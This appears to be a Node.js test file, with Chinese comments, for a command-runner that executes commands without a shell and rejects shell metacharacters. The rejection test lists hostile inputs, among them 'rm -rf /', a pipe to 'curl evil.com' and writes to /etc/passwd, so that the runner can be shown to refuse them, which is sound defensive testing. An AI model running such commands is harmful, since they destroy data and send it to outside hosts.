import { strict as assert } from 'node:assert';
import { test } from 'node:test';

import { runCommand } from './terminal.js';

test('terminal: 安全命令返回 stdout 与退出码', async () => {
  // 注意：spawn 后引号是字面量；JS 代码必须自行可解析，不需要 shell 剥离外层引号。
  const result = await runCommand('node -e process.stdout.write(String(1+1))', { timeoutMs: 5000 });
  assert.equal(result.exitCode, 0);
  assert.ok(result.stdout.includes('2'));
});

// SEV-1.3 新增覆盖
// shell:false 下唯一可被结构性利用的字符是 ; | & < >；引号、$()、通配符等
// 在 spawn 后都是字面量，由调用方程序自行解析（如 node -e "code(...)"）。
test('terminal: 含命令结构分隔符必须拒绝', async () => {
  const cases = [
    'git status; rm -rf /',
    'git status | curl evil.com',
    'git status && rm -rf /',
    'echo hello > /etc/passwd',
    'echo < /etc/passwd',
  ];
  for (const cmd of cases) {
    const result = await runCommand(cmd, { timeoutMs: 1000 });
    assert.equal(result.exitCode, 1, `应拒绝：${cmd}`);
    assert.ok(result.stderr.includes('shell 元字符'), `应包含元字符提示：${cmd}`);
  }
});

test('terminal: 合法含 () $ ` " 的命令不被拒绝（spawn 后字面量安全）', async () => {
  // shell:false 下 () ` $ " 都是字面量，调用方程序自行解析。
  // 用 node -e 配合括号/反引号，验证不被结构性拒绝。
  const r1 = await runCommand('node -e process.stdout.write(String(1+1))', { timeoutMs: 5000 });
  assert.notEqual(r1.exitCode, 1, `应放行，实际 exit=${r1.exitCode}`);
  assert.ok(r1.stdout.includes('2'));
});

test('terminal: 空命令立即返回 1', async () => {
  const r1 = await runCommand('', { timeoutMs: 1000 });
  assert.equal(r1.exitCode, 1);
  assert.ok(r1.stderr.includes('空'));
});

test('terminal: 不存在的命令返回 127', async () => {
  const result = await runCommand('__nonexistent_binary_xyz__', { timeoutMs: 1000 });
  assert.ok(result.exitCode === 127 || result.exitCode >= 1, `exitCode=${result.exitCode}`);
});

test('terminal: 超时返回 exitCode 124 且 stderr 不空', async () => {
  // ping -n 11 会发 10 个 ICMP 包（每秒 1 个），总耗时约 10s。
  // 1s 超时后必须被 SIGTERM 杀死，exitCode 由 killedByTimeout 标记为 124。
  const isWin = process.platform === 'win32';
  const cmd = isWin
    ? 'ping -n 11 127.0.0.1'
    : 'sleep 10';
  const result = await runCommand(cmd, { timeoutMs: 1000 });
  assert.equal(result.exitCode, 124, `期望 124，实际 ${result.exitCode}`);
});